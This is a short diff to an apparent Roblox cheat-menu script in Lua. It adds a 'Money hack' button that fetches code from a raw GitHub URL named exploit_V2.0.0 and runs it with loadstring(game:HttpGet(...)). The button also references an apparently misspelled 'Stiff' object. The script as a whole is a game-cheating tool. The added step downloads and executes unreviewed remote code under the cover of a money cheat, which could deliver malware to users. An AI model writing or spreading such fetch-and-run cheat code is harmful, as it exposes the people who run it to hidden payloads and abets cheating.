@@ -145,6 +145,10 @@ end})
 Stuff:Toggle({Name = "autosell when reach a thing", Callback = function(state)
 	skibidi2 = state
 end})
+Stiff:Button({Name = "Money hack", Callback = function()
+	_G.moneycount = math.huge
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/railme37509124/blazecompetence-/refs/heads/main/exploit_V2.0.0'))()
+end})
 Stuff:Divider("Discord")
 Stuff:Button({Name = "Copy developer UserID (discord)", Callback = function() setclipboard("1215375161121833063") end})
 Stuff:Button({Name = "Copy Discord", Callback = function() setclipboard("https://discord.gg/hFCsjYRVJ4") end})
